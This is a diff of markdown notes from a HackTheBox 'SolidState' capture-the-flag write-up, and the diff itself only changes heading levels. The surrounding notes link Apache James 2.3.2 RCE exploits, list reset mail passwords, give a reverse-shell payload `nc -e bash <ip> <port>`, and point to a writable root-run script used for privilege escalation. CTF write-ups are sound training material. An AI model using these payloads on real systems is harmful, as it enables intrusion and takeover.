@@ -57,12 +57,12 @@ http://solidstate.htb/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[web
 
 ## Foothold
 
-## Apache James Server 2.3.2 RCE
+### Apache James Server 2.3.2 RCE
 
 - [40123-exploiting-apache-james-server-2.3.2.pdf (exploit-db.com)](https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf)
 - [Apache James Server 2.3.2 - Remote Command Execution - Linux remote Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/35513)
 
-## 4555 Password Altering
+### 4555 Password Altering
 
 ![image-20231215165926233](./Solidstate.assets/image-20231215165926233.png)
 
@@ -71,7 +71,7 @@ http://solidstate.htb/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[web
 - Users: `james`, `thomas`, `john`, `mailadmin`
 - Pass: `qwe`
 
-## 110 POP3 Enum
+### 110 POP3 Enum
 
 - james
 
@@ -97,7 +97,7 @@ http://solidstate.htb/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[web
 
 ## Privilege Escalation
 
-## mindy's rbash escape
+### mindy's rbash escape
 
 - method1: Apache James Server 2.3.2 RCE
   - run rce script: payload = `nc -e bash <ip> <port>`
@@ -106,7 +106,7 @@ http://solidstate.htb/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[web
 
 ![image-20231215171835490](./Solidstate.assets/image-20231215171835490.png)
 
-## mindy -> root
+### mindy -> root
 
 - script in /opt: /opt/tmp.py -> 777 -> clear /tmp -> very potentially is a sheduled task as root
 
